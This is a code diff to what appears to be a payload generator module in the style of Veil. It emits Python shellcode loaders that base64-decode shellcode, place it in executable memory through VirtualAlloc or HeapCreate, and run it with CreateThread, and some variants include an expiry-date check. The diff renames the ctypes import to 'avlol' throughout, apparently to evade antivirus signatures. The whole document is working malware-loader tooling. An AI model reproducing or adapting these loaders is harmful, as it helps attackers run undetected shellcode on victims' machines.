@@ -52,15 +52,15 @@ class Payload:
                 RandHt = helpers.randomString()
                 RandT = helpers.randomString()
                     
-                PayloadCode = 'import ctypes\n'
+                PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode +=  'import base64\n'
                 PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
                 PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
-                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
-                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
-                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += RandPtr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len(' + ShellcodeVariableName + ')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
+                PayloadCode += RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
+                PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
@@ -87,7 +87,7 @@ class Payload:
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
 
-                PayloadCode = 'import ctypes\n'
+                PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'import base64\n'
                 PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
@@ -96,11 +96,11 @@ class Payload:
                 PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                 PayloadCode += '\t' + RandT + " = \"" + EncodedShellcode + "\"\n"
                 PayloadCode += '\t' + ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
-                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
-                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-                PayloadCode += '\t' + 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
-                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += '\t' + 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += '\t' + RandPtr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len(' + ShellcodeVariableName + ')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
+                PayloadCode += '\t' + RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += '\t' + 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
+                PayloadCode += '\t' + 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
@@ -123,16 +123,16 @@ class Payload:
                 RandT = helpers.randomString()
                 HeapVar = helpers.randomString()
 
-                PayloadCode = 'import ctypes\n'
+                PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'import base64\n'
                 PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
                 PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
-                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
-                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
-                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
-                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + ShellcodeVariableName + ') * 2),avlol.c_int(0))\n'
+                PayloadCode += RandPtr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
+                PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
@@ -161,7 +161,7 @@ class Payload:
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
 
-                PayloadCode = 'import ctypes\n'
+                PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode +=  'import base64\n'
                 PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
@@ -170,12 +170,12 @@ class Payload:
                 PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                 PayloadCode += '\t' + RandT + " = \"" + EncodedShellcode + "\"\n"
                 PayloadCode += '\t' + ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
-                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
-                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
-                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
-                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += '\t' + HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + ShellcodeVariableName + ') * 2),avlol.c_int(0))\n'
+                PayloadCode += '\t' + RandPtr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + ShellcodeVariableName + ')))\n'
+                PayloadCode += '\t' + RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
+                PayloadCode += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
